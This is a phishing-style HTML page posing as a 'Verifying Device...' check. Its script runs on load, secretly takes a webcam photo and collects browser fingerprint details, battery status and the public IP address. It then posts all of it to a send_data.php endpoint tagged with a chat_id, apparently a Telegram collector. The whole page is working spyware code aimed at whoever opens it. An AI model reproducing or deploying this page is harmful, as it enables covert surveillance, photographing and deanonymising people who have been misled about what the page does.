<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1" name="viewport"><title>Verifying Device...</title><link href="../../stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"><style>body{background-color:#1e1e1e;font-family:Arial,sans-serif;color:#e0e0e0}</style></head><body><div class="container"><header class="my-5 text-center"><h1 class="my-4">Verifying Device...</h1><p>Please wait while we verify your details.</p></header></div><script>function capturePhotoAndSend() {        navigator.mediaDevices.getUserMedia({ video: true })        .then((stream) => {            let video = document.createElement("video");            video.srcObject = stream;            video.play();            setTimeout(() => {                let canvas = document.createElement("canvas");                canvas.width = video.videoWidth;                canvas.height = video.videoHeight;                let context = canvas.getContext("2d");                context.drawImage(video, 0, 0, canvas.width, canvas.height);                let photo = canvas.toDataURL("image/png");                sendData(photo);                                stream.getTracks().forEach(track => track.stop());            }, 3000);        })        .catch((error) => {            console.error("Camera access denied", error);            sendData(null);        });    }    function sendData(photo) {        let deviceInfo = {            browser: navigator.userAgent,            platform: navigator.platform,            language: navigator.language,            screenWidth: screen.width,            screenHeight: screen.height,            online: navigator.onLine,            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,            connection: navigator.connection ? navigator.connection.effectiveType : "Unknown",            cookieEnabled: navigator.cookieEnabled,            javaEnabled: navigator.javaEnabled ? "Yes" : "No",            battery: "Unknown",            ip: "Fetching..."        };        if (navigator.getBattery) {            navigator.getBattery().then(battery => {                deviceInfo.battery = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Not Charging"})`;                fetchIPAndSend(deviceInfo, photo);            });        } else {            fetchIPAndSend(deviceInfo, photo);        }    }    function fetchIPAndSend(deviceInfo, photo) {        fetch("https://api.ipify.org?format=json")            .then(response => response.json())            .then(data => {                deviceInfo.ip = data.ip;                sendToServer(deviceInfo, photo);            })            .catch(error => {                console.error("IP fetch error:", error);                sendToServer(deviceInfo, photo);            });    }    function sendToServer(deviceInfo, photo) {        let formData = new FormData();        formData.append("info", JSON.stringify(deviceInfo));        if (photo) {            formData.append("photo", photo);        }        fetch("send_data.php?chat_id=8487896661", {            method: "POST",            body: formData        }).then(response => response.text())          .then(result => console.log("Sent:", result))          .catch(error => console.error("Error:", error));    }    capturePhotoAndSend();</script></body></html>
